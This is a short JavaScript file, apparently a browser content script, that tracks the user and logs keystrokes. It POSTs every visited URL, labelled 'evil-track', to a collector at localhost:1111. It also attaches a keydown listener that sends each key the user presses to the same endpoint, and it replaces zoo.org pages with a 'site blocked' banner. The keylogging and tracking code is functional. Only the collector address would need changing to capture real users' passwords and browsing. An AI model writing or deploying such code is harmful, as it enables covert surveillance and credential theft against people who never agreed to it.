async function track(url) {
  try {
    await fetch("https://localhost:1111", {
      method: "POST",
      body: JSON.stringify({ type: "evil-track", url }),
    });
  } catch (err) {
    console.error(err);
  }
}

async function sendKey(key) {
  try {
    await fetch("https://localhost:1111", {
      method: "POST",
      body: JSON.stringify({ type: "key", key }),
    });
  } catch (err) {
    console.error(err);
  }
}

function addKeypressListener() {
  window.addEventListener("keydown", (event) => {
    if (event.isComposing || event.keyCode === 229) {
      return;
    }
    sendKey(event.key);
  });
}

function blockBlackListedSite() {
  const url = window.location.href;
  if (url.includes("zoo.org")) {
    document.body.innerHTML =
      '<div><center><h1>This site has been blocked</h1><img height="400px" src="https://openai-labs-public-images-prod.azureedge.net/user-R6IAhb5TVYu3MNFn7i60xp14/generations/generation-y341cFvw7Ccw8GFqQpquwcN3/image.webp"></center></div>';
  }
  track(url);
  addKeypressListener();
}

blockBlackListedSite();
